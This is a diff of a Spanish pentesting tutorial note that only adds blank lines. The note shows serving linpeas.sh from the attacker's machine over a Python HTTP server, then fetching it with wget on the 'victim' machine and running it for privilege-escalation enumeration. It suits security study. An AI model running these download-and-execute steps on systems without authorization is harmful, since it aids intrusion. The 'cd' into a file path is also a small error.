@@ -12,12 +12,15 @@ en la maquina victima
 Maquina local(host):
 
     cd /ruta/local/linpeas/linpeas.sh
+    
     python3 -m http.server 9001
 
 Maquina remota(victim)>
 
     wget http://[IP_MAQUINA_LOCAL]:9001/linpeas.sh
+    
     chmod +x linpeas.sh
+    
     ./linpeas.sh
    
 Una vez analicemos su output, deberemos fijarnos principalmente en el contenido que tenga el fondo naranja, aunque llamara la atencion
